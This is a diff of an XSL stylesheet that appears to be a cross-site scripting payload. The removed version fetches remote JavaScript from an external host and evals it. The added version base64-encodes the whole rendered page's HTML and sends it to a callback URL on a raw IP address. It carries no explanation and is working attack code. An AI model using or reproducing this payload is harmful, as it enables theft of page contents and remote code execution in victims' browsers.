@@ -3,9 +3,9 @@
 
 <xsl:stylesheet id="color-change" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 
- <xsl:template match="/">
- <html>
-  <body>
+<xsl:template match="/">
+<html>
+<body>
 	<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1000 1500">
 		<foreignObject id="myObj" width="1000" height="1500">
 		    <div style="font-size:xxx-large" xmlns="http://www.w3.org/1999/xhtml">
@@ -17,10 +17,31 @@
 		    </div>
 		</foreignObject>
 	</svg>
-  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://xss.khara.one/a");a.send();</script>
-<img src="https://8.8.8.8:8888" />
-  </body>
+	<script>	
+		<![CDATA[
+		function utf8_to_b64( str ) {
+		    return window.btoa(unescape(encodeURIComponent( str )));
+		}
+		function get_dom_text() {
+		    var text_extractions_to_try = [
+		        document.documentElement.outerHTML,
+		    ];
+		    for (var i = 0; i < text_extractions_to_try.length; i++) {
+		        if (typeof text_extractions_to_try[i] === 'string') {
+		            return utf8_to_b64(text_extractions_to_try[i]);
+		        }
+		    }
+		    return '';
+		}
+		
+		b=new XMLHttpRequest();
+		b.open("GET", "http://149.28.39.49/callback?data="+get_dom_text());
+		b.send();
+		]]>
+	</script>
+	<img src="https://8.8.8.8:8888" />
+</body>
 </html>
 
- </xsl:template>
+</xsl:template>
 </xsl:stylesheet>
